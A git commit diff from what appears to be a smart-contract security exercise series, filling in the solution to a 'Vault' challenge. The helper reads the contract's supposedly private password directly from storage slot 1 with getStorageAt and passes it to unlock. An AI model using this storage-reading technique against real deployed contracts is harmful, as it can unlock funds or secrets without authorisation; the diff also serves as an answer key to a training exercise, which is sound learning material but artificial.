8970fac208efda4d248f0b968a1fb35bcdba6263
Le Yu <leyu00@gmail.com>
2022-06-20 10:25:23 -0400

    Completed Vault

--- contracts/4. Vault/VaultHelper.ts
+++ contracts/4. Vault/VaultHelper.ts
@@ -1,13 +1,8 @@
-import { expect } from "chai";
-import { ethers, waffle } from "hardhat";
+import { ethers } from "hardhat";
 
 const helper = async (victim: any) => {
-  /* 
-    Add code here that will help you pass the test
-    Note: Unlock without using the string "A very strong password"
-    Unlock the vault by somehow reading the private password from 
-    Vault directly
-  */
+  const passwordAsHex = await ethers.provider.getStorageAt(victim.address, 1);
+  await victim.unlock(passwordAsHex);
 };
 
 export default helper;
